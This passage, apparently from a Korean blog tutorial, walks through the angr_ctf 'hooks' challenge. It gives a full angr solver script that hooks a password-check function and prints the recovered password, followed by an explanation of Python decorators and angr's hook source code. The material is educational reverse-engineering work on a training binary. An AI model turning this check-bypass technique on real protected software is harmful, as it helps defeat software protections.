&#xC9C0;&#xC815;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC758; &#xAE38;&#xC774;&#xAC00; 5&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC0AC;&#xC774;&#xC988;&#xB294; 5&#xB85C; &#xC9C0;&#xC815;&#xC744; &#xD574;&#xC8FC;&#xC5C8;&#xAD6C;&#xC694;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xC81C; &#xD6C4;&#xD0B9; &#xD568;&#xC218;&#xB97C; &#xC9C0;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-meta">@project.hook(check_equals_called_address, length=instruction_to_skip_length)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">skip_check_equals_</span>(<span class="hljs-params">state</span>):</span>  user_input_buffer_address = <span class="hljs-number">0x0804A054</span>  user_input_buffer_length = <span class="hljs-number">16</span>  user_input_string = state.memory.load(    user_input_buffer_address,     user_input_buffer_length  )    check_against_string = <span class="hljs-string">&apos;XYMKBKUHNIQYNQXE&apos;</span> <span class="hljs-comment"># :string</span>  state.regs.eax = claripy.If(    user_input_string == check_against_string,     claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>),     claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)  )simulation = project.factory.simgr(initial_state)</code></pre><p>hook &#xD568;&#xC218;&#xC5D0; &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xC815;&#xD55C; &#xB0B4;&#xC6A9;&#xB4E4;&#xC744; &#xC778;&#xC790;&#xB85C; &#xB118;&#xACA8;&#xC8FC;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBD80;&#xD130; &#xD6C4;&#xD0B9;&#xD558;&#xB3C4;&#xB85D; &#xC9C0;&#xC2DC;&#xB97C; &#xD558;&#xB294;&#xAC70;&#xACA0;&#xC8E0;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C; &#xD568;&#xC218;&#xB97C; &#xD558;&#xB098; &#xC120;&#xC5B8;&#xD574;&#xC8FC;&#xB294;&#xB370; &#xC774;&#xAC8C; &#xC774;&#xC81C; &#xD6C4;&#xD0B9;&#xD560; &#xB300;&#xC0C1;&#xC744; &#xAC74;&#xB108;&#xB6F0;&#xB294; &#xB300;&#xC2E0; &#xC2E4;&#xD589;&#xD560; &#xB0B4;&#xC6A9;&#xC778;&#xB4EF; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC5D0;&#xC11C;&#xB294; &#xC5F0;&#xC0B0;&#xB41C; &#xACB0;&#xACFC;&#xAC12;&#xC774; &#xD2B9;&#xC815; &#xBB38;&#xC790;&#xC5F4;&#xC778;&#xC9C0; &#xBE44;&#xAD50;&#xD574;&#xC8FC;&#xACE0; &#xACB0;&#xACFC; &#xAC12;&#xC774; 1&#xC774; &#xB418;&#xB294;&#xB3C4;&#xB85D; &#xD574;&#xC57C;&#xACA0;&#xC8E0;? &#xBA3C;&#xC800; &#xBE44;&#xAD50;&#xD574;&#xC57C;&#xD560; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0;&#xC11C; &#xAC12;&#xC744; &#xB85C;&#xD2B8;&#xD558;&#xACE0; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; &#xBE44;&#xAD50;&#xD574;&#xC57C;&#xD560; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC9C0;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC544;&#xC2DC;&#xB2E4;&#xC2DC;&#xD53C; &#xD568;&#xC218;&#xC758; &#xB9AC;&#xD134;&#xAC12;&#xC740; &#xBCF4;&#xD1B5; eax&#xC5D0; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xB9C8;&#xC9C0;&#xB9C9;&#xC5D0; claripy&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xC778;&#xC790;&#xB85C; &#xB123;&#xC740; &#xC870;&#xAC74;, &#xC989; &#xC5F0;&#xC0B0;&#xAC12;&#xC774; &#xC6B0;&#xB9AC;&#xAC00; &#xBE44;&#xAD50;&#xD574;&#xC57C;&#xD560; &#xBB38;&#xC790;&#xC5F4;&#xACFC; &#xAC19;&#xC740;&#xC9C0; &#xC5EC;&#xBD80;&#xC5D0; &#xB530;&#xB77C; eax&#xB97C; 1&#xB85C; &#xC124;&#xC815;&#xD560; &#xAC83;&#xC774;&#xB0D0; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xAC83;&#xC774;&#xB0D0;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xAC00; &#xC54C;&#xC544;&#xC11C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC744; &#xD574;&#xC8FC;&#xACA0;&#xC8E0;. &#xB098;&#xBA38;&#xC9C0; &#xB4A4;&#xC5D0; &#xBD80;&#xBD84;&#xC740; &#xC55E; &#xBB38;&#xC81C;&#xB4E4;&#xACE0; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><h2 id="sol09-py"><a href="#sol09-py" class="headerlink" title="sol09.py"></a>sol09.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-keyword">import</span> traceback<span class="hljs-keyword">import</span> logging<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  check_equals_called_address = <span class="hljs-number">0x080486B3</span>  instruction_to_skip_length = <span class="hljs-number">5</span>  print(type(project.hook))<span class="hljs-meta">  @project.hook(check_equals_called_address, length=instruction_to_skip_length)</span>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">skip_check_equals_</span>(<span class="hljs-params">state</span>):</span>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> traceback.format_stack():      print(line.strip())    user_input_buffer_address = <span class="hljs-number">0x0804A054</span>    user_input_buffer_length = <span class="hljs-number">16</span>    user_input_string = state.memory.load(      user_input_buffer_address,       user_input_buffer_length    )        check_against_string = <span class="hljs-string">&apos;XYMKBKUHNIQYNQXE&apos;</span>    state.regs.eax = claripy.If(      user_input_string == check_against_string,       claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>),       claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)    )  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution = solution_state.posix.dumps(sys.stdin.fileno())    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol09.py <span class="hljs-number">09</span>_angr_hooks WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">774</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">774</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable <span class="hljs-keyword">and</span> continuing. You can resolve this by:WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">774</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">1</span>) setting a value to the initial stateWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">774</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">2</span>) adding the state option ZERO_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to make unknown regions hold nullWARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">774</span> | angr.storage.memory_mixins.default_filler_mixin | <span class="hljs-number">3</span>) adding the state option SYMBOL_FILL_UNCONSTRAINED_{MEMORY,REGISTERS}, to suppress these messages.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">775</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register edi <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048791</span> (__libc_csu_init+<span class="hljs-number">0x1</span> <span class="hljs-keyword">in</span> <span class="hljs-number">09</span>_angr_hooks (<span class="hljs-number">0x8048791</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">36</span>,<span class="hljs-number">776</span> | angr.storage.memory_mixins.default_filler_mixin | Filling register ebx <span class="hljs-keyword">with</span> <span class="hljs-number">4</span> unconstrained bytes referenced <span class="hljs-keyword">from</span> <span class="hljs-number">0x8048793</span> (__libc_csu_init+<span class="hljs-number">0x3</span> <span class="hljs-keyword">in</span> <span class="hljs-number">09</span>_angr_hooks (<span class="hljs-number">0x8048793</span>))WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">06</span>:<span class="hljs-number">44</span>:<span class="hljs-number">38</span>,<span class="hljs-number">681</span> | claripy.ast.bv | BVV value <span class="hljs-keyword">is</span> being coerced <span class="hljs-keyword">from</span> a unicode string, encoding <span class="hljs-keyword">as</span> utf<span class="hljs-number">-8</span><span class="hljs-string">b&apos;ZXIDRXEORJOTFFJNWUFAOUBLOGLQCCGK&apos;</span>j0ker@angr:~/angr_ctf/dist$ ./<span class="hljs-number">09</span>_angr_hooks Enter the password: ZXIDRXEORJOTFFJNWUFAOUBLOGLQCCGKGood Job.</code></pre><h2 id="&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;-&#xADF8;&#xB9AC;&#xACE0;-hook-&#xC791;&#xB3D9;&#xC6D0;&#xB9AC;"><a href="#&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;-&#xADF8;&#xB9AC;&#xACE0;-hook-&#xC791;&#xB3D9;&#xC6D0;&#xB9AC;" class="headerlink" title="&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130; @ &#xADF8;&#xB9AC;&#xACE0; hook &#xC791;&#xB3D9;&#xC6D0;&#xB9AC;?"></a>&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130; @ &#xADF8;&#xB9AC;&#xACE0; hook &#xC791;&#xB3D9;&#xC6D0;&#xB9AC;?</h2><p>&#xC0AC;&#xC2E4; &#xC774;&#xB807;&#xAC8C; &#xBB38;&#xC81C;&#xB294; &#xD480;&#xB838;&#xC9C0;&#xB9CC; &#xC800;&#xB294; &#xC774; &#xD6C4;&#xD0B9;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xB3D9;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xB9E4;&#xC6B0; &#xAD81;&#xAE08;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;&#xB77C;&#xB294; &#xAC83;&#xB3C4; &#xCF54;&#xB4DC;&#xB97C; &#xBCFC; &#xB54C; &#xC5B4;&#xB834;&#xD48B;&#xC774; &#xC54C;&#xACE0;&#xB9CC; &#xC788;&#xC5C8;&#xC9C0; &#xC81C;&#xB300;&#xB85C;&#xB294; &#xBAB0;&#xB77C;&#xC11C; &#xC774;&#xCC38;&#xC5D0; &#xC880; &#xB354; &#xACF5;&#xBD80;&#xD574; &#xBCF4;&#xAE30;&#xB85C; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;"><a href="#&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;" class="headerlink" title="&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;"></a>&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;</h3><p>&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;&#xB294; &#xC544;&#xB798; &#xD568;&#xC218;&#xB97C; <code>wrapping</code>&#xD574;&#xC11C; &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xB54C; &#xC790;&#xC2E0;&#xC774; &#xC6D0;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC8FC;&#xB85C; &#xB514;&#xBC84;&#xAE45;&#xD560; &#xB54C;&#xB098; &#xCF54;&#xB4DC; &#xAC04;&#xACB0;&#xD654;&#xB97C; &#xC704;&#xD574; &#xB9CE;&#xC774; &#xC4F0;&#xC778;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xAC04;&#xB2E8;&#xD55C; &#xC608;&#xC2DC;&#xB97C; &#xD55C;&#xBC88; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Code:</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decoratorFunctionWithArguments</span>(<span class="hljs-params">arg1, arg2, arg3</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrap</span>(<span class="hljs-params">f</span>):</span>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Inside wrap()&quot;</span>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapped_f</span>(<span class="hljs-params">*args</span>):</span>            <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Inside wrapped_f()&quot;</span>            <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Decorator arguments:&quot;</span>, arg1, arg2, arg3            f(*args)            <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;After f(*args)&quot;</span>        <span class="hljs-keyword">return</span> wrapped_f    <span class="hljs-keyword">return</span> wrap<span class="hljs-meta">@decoratorFunctionWithArguments(&quot;hello&quot;, &quot;world&quot;, 42)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sayHello</span>(<span class="hljs-params">a1, a2, a3, a4</span>):</span>    <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;sayHello arguments:&apos;</span>, a1, a2, a3, a4<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;After decoration&quot;</span><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Preparing to call sayHello()&quot;</span>sayHello(<span class="hljs-string">&quot;say&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;argument&quot;</span>, <span class="hljs-string">&quot;list&quot;</span>)<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;after first sayHello() call&quot;</span>sayHello(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;different&quot;</span>, <span class="hljs-string">&quot;set of&quot;</span>, <span class="hljs-string">&quot;arguments&quot;</span>)<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;after second sayHello() call&quot;</span></code></pre><p>Output:</p><pre><code class="hljs python">Inside wrap()After decorationPreparing to call sayHello()Inside wrapped_f()Decorator arguments: hello world <span class="hljs-number">42</span>sayHello arguments: say hello argument listAfter f(*args)after first sayHello() callInside wrapped_f()Decorator arguments: hello world <span class="hljs-number">42</span>sayHello arguments: a different set of argumentsAfter f(*args)after second sayHello() call</code></pre><blockquote><p>&#xCD9C;&#xCC98; : <a href="https://www.artima.com/weblogs/viewpost.jsp?thread=240845">Python Decorators II: Decorator Arguments</a></p></blockquote><p>&#xBB38;&#xC81C;&#xC5D0;&#xC11C; <code>hook</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xBE44;&#xC2B7;&#xD55C; &#xC608;&#xC2DC;&#xB97C; &#xAC00;&#xC838;&#xC640; &#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130; @&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xB4A4;&#xC5D0; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C; wrap &#xD568;&#xC218;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xC9C0;&#xB9CC; &#xC2E4;&#xD589;&#xC740; &#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC18;&#xBA74;&#xC5D0; <code>sayHello</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xC774; &#xB54C; wrap &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xC774; &#xB418;&#xBA74;&#xC11C; <code>wrapped_f</code> &#xD568;&#xC218;&#xB97C; &#xB9AC;&#xD134;&#xD558;&#xB294;&#xB370;, &#xC774; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB2E4;&#xC2DC; &#xBC1B;&#xC544;&#xC11C; <code>sayHello</code>&#xC5D0; &#xC804;&#xB2EC;&#xB41C; &#xC778;&#xC790;&#xB4E4;&#xC774; <code>wrapped_f</code> &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xBA74;&#xC11C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>wrapped_f</code> &#xD568;&#xC218; &#xC548;&#xC5D0;&#xC11C; <code>f(*args)</code>&#xB97C; &#xD1B5;&#xD574; <code>sayHello</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC989; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;&#xB294; @ &#xB4A4;&#xC5D0; &#xBD99;&#xC740; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xACE0; &#xB9AC;&#xD134;&#xB41C; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xBC1B;&#xC544; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130; &#xBC11;&#xC5D0; &#xC788;&#xB294; &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; &#xC778;&#xC790;&#xB85C; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;&#xC5D0;&#xC11C; &#xB9AC;&#xD134;&#xBC1B;&#xC740; &#xD568;&#xC218;&#xB97C; &#xC2E4;&#xD589;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBB54;&#xAC00; &#xC880; &#xBCF5;&#xC7A1;&#xD558;&#xB124;&#xC694;&#x2026;.</p><pre><code class="hljs python">sayHello(a,b,c,d) -&gt; wrap(sayHello) -&gt; wrapped(a,b,c,d) -&gt; sayHello(a,b,c,d)</code></pre><p>&#xC800;&#xB3C4; &#xACF5;&#xBD80;&#xD558;&#xBA74;&#xC11C; &#xC815;&#xB9AC;&#xB97C; &#xD558;&#xACE0; &#xC788;&#xB294;&#xB370; &#xC880; &#xB354; &#xC790;&#xC138;&#xD55C; &#xC124;&#xBA85;&#xC740; &#xC544;&#xB798; &#xB9C1;&#xD06C;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC2DC;&#xBA74; &#xB420;&#xAC70; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://www.artima.com/weblogs/viewpost.jsp?thread=240808">Decorators I: Introduction to Python Decorators</a></p><p>&#xB370;&#xCF54;&#xB808;&#xC774;&#xD130;&#xB97C; &#xACF5;&#xBD80;&#xD558;&#xACE0; &#xB098;&#xC11C; &#xC81C;&#xAC00; &#xAC00;&#xC7A5; &#xC758;&#xBB38;&#xC774;&#xC5C8;&#xB358; &#xC810;&#xC740; &#xBAA8;&#xB4E0; &#xC608;&#xC2DC;&#xC5D0;&#xC11C;&#xB294; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130; &#xC544;&#xB798; &#xC120;&#xC5B8;&#xB41C; &#xD568;&#xC218;&#xB4E4;&#xC774; &#xD638;&#xCD9C;&#xC774; &#xB418;&#xB294;&#xB370;, &#xC65C; &#xC194;&#xB8E8;&#xC158; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xD638;&#xCD9C;&#xC774; &#xC548;&#xB410;&#xC74C;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; &#xC798; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xB294;&#xAC00;? &#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBD80;&#xBD84;&#xC744; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574; angr &#xCF54;&#xB4DC;&#xB97C; &#xC880; &#xC0B4;&#xD3B4;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook</span>(<span class="hljs-params">self, addr, hook=None, length=<span class="hljs-number">0</span>, kwargs=None, replace=False</span>):</span>        <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">        Hook a section of code with a custom function. This is used internally to provide symbolic</span><span class="hljs-string">        summaries of library functions, and can be used to instrument execution or to modify</span><span class="hljs-string">        control flow.</span><span class="hljs-string"></span><span class="hljs-string">        When hook is not specified, it returns a function decorator that allows easy hooking.</span><span class="hljs-string">        Usage::</span><span class="hljs-string"></span><span class="hljs-string">            # Assuming proj is an instance of angr.Project, we will add a custom hook at the entry</span><span class="hljs-string">            # point of the project.</span><span class="hljs-string">            @proj.hook(proj.entry)</span><span class="hljs-string">            def my_hook(state):</span><span class="hljs-string">                print(&quot;Welcome to execution!&quot;)</span><span class="hljs-string"></span><span class="hljs-string">        :param addr:        The address to hook.</span><span class="hljs-string">        :param hook:        A :class:`angr.project.Hook` describing a procedure to run at the</span><span class="hljs-string">                            given address. You may also pass in a SimProcedure class or a function</span><span class="hljs-string">                            directly and it will be wrapped in a Hook object for you.</span><span class="hljs-string">        :param length:      If you provide a function for the hook, this is the number of bytes</span><span class="hljs-string">                            that will be skipped by executing the hook by default.</span><span class="hljs-string">        :param kwargs:      If you provide a SimProcedure for the hook, these are the keyword</span><span class="hljs-string">                            arguments that will be passed to the procedure&apos;s `run` method</span><span class="hljs-string">                            eventually.</span><span class="hljs-string">        :param replace:     Control the behavior on finding that the address is already hooked. If</span><span class="hljs-string">                            true, silently replace the hook. If false (default), warn and do not</span><span class="hljs-string">                            replace the hook. If none, warn and replace the hook.</span><span class="hljs-string">        &quot;&quot;&quot;</span>        <span class="hljs-keyword">if</span> hook <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:            <span class="hljs-comment"># if we haven&apos;t been passed a thing to hook with, assume we&apos;re being used as a decorator</span>            <span class="hljs-keyword">return</span> self._hook_decorator(addr, length=length, kwargs=kwargs)        <span class="hljs-keyword">if</span> kwargs <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>: kwargs = {}        l.debug(<span class="hljs-string">&apos;hooking %s with %s&apos;</span>, self._addr_to_str(addr), str(hook))        <span class="hljs-keyword">if</span> self.is_hooked(addr):            <span class="hljs-keyword">if</span> replace <span class="hljs-keyword">is</span> <span class="hljs-literal">True</span>:                <span class="hljs-keyword">pass</span>            <span class="hljs-keyword">elif</span> replace <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>:                l.warning(<span class="hljs-string">&quot;Address is already hooked, during hook(%s, %s). Not re-hooking.&quot;</span>, self._addr_to_str(addr), hook)                <span class="hljs-keyword">return</span>            <span class="hljs-keyword">else</span>:                l.warning(<span class="hljs-string">&quot;Address is already hooked, during hook(%s, %s). Re-hooking.&quot;</span>, self._addr_to_str(addr), hook)        <span class="hljs-keyword">if</span> isinstance(hook, type):            <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&quot;Please instanciate your SimProcedure before hooking with it&quot;</span>)        <span class="hljs-keyword">if</span> callable(hook):            hook = SIM_PROCEDURES[<span class="hljs-string">&apos;stubs&apos;</span>][<span class="hljs-string">&apos;UserHook&apos;</span>](user_func=hook, length=length, **kwargs)        self._sim_procedures[addr] = hook</code></pre><p><code>hook</code> &#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74; &#xBA3C;&#xC800; &#xC778;&#xC790; <code>hook</code>&#xC774; <code>None</code>&#xC774;&#xBA74; <code>_hook_decorator</code> &#xD568;&#xC218;&#xAC00; &#xC2E4;&#xD589;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_hook_decorator</span>(<span class="hljs-params">self, addr, length=<span class="hljs-number">0</span>, kwargs=None</span>):</span>        <span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-string">        Return a function decorator that allows easy hooking. Please refer to hook() for its usage.</span><span class="hljs-string"></span><span class="hljs-string">        :return: The function decorator.</span><span class="hljs-string">        &quot;&quot;&quot;</span>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hook_decorator</span>(<span class="hljs-params">func</span>):</span>            self.hook(addr, func, length=length, kwargs=kwargs)            <span class="hljs-keyword">return</span> func        <span class="hljs-keyword">return</span> hook_decorator    <span class="hljs-comment">#</span>    <span class="hljs-comment"># Pickling</span>    <span class="hljs-comment">#</span></code></pre><p>&#xC774; &#xD568;&#xC218;&#xB294; &#xC704; &#xC608;&#xC81C;&#xC5D0;&#xC11C; &#xBCF8; <code>wrap</code> &#xD568;&#xC218;&#xAC00; &#xC548;&#xC5D0; &#xB4E4;&#xC5B4; &#xC788;&#xB294;&#xAC83;&#xCC98;&#xB7FC; &#xBCF4;&#xC774;&#xB124;&#xC694;. &#xADF8;&#xB9AC;&#xACE0; &#xC548;&#xC5D0;&#xC11C; &#xC120;&#xC5B8;&#xD55C; <code>hook_decorator</code> &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xB9AC;&#xD134;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>hook_decorator</code> &#xD568;&#xC218;&#xAC00; &#xBD88;&#xB9AC;&#xBA74; &#xB2E4;&#xC2DC; <code>hook</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370;, &#xC774; &#xB54C;&#xB294; &#xC804;&#xB2EC;&#xB41C; &#xB370;&#xCF54;&#xB808;&#xC774;&#xD130; &#xC544;&#xB798; &#xD568;&#xC218;&#xC758; &#xD3EC;&#xC778;&#xD130;&#xB3C4; &#xAC19;&#xC774; &#xC804;&#xB2EC;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; <code>hook</code> &#xD568;&#xC218;&#xC5D0;&#xC11C;&#xB294; 